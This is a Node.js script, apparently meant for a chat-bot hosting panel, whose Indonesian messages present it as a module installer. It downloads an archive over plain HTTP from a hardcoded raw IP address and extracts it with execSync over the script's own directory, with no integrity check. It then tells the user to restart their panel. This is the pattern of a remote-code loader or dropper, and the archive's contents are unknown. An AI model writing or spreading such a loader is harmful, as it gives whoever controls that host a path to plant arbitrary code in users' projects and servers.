const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

async function delay(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

console.log(`====================
MEMULAI DOWNLOAD MODULE BOT
Mohon Tunggu...
====================

`)

async function downloadFile(url, savepath) {
  const writer = fs.createWriteStream(savepath);

  const response = await axios({
    url,
    method: 'GET',
    responseType: 'stream'
  });

  response.data.pipe(writer);

  return new Promise((resolve, reject) => {
    writer.on('finish', resolve);
    writer.on('error', reject);
  });
}

const url = 'http://45.131.64.15:6121/installer';
const savepath = path.resolve(__dirname, 'module.tar.gz');

async function start(){
await downloadFile(url, savepath).then(() => {
  console.log(`====================
  DOWNLOAD SELESAI
  Memulai Extrak/Decompres
  File module.tar.gz
  ====================`);
}).catch(console.error);
// Ganti dengan path file tar.gz yang ingin diekstrak
const tarGzFile = path.join(__dirname, 'module.tar.gz');
const outputDir = __dirname
// Eksekusi perintah untuk mengekstrak file
try {
execSync(`tar -xzf ${tarGzFile} -C ${outputDir}`, { stdio: 'inherit' });
 console.log('File berhasil diekstrak silahkan tekan stop panel anda');
} catch (error) {
 console.error('Terjadi kesalahan saat mengekstrak file:', error.message);
}
await delay(180000)
}
start()